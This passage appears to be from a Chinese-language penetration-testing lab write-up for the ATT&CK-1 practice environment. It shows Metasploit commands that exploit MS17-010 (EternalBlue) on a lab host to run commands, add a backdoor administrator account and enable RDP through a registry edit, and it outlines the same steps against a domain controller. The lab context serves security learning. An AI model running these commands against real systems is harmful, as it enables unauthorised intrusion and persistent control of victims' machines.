其实是可以攻击成功的，不知道为啥我这里一直不行

除了直接攻击，还使用`auxiliary/admin/smb/ms17_010_command`可以执行命令

```csharp
use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.52.141
set command whoami
run
```

```csharp
set command net user blckder02 8888! /add添加用户；
set command net localgroup administrators blckder02 /add添加管理员权限；
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'执行命令开启3389端口，这里要么用单引号把命令引住，要么用反斜杠对反斜杠和引号进行转义，否则会出错；
```

## 攻击域控

域控是windows server 2008也是可以利用永恒之蓝攻击的，但是我这里不知道什么情况无法攻击成功，但是可以执行命令

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2031.png)

跟前面一样，创建用户加入管理员组，关闭防火墙或者放行3389端口，直接远程桌面连接

- 使用永恒之蓝攻击的机器都是system权限的不需要进行提权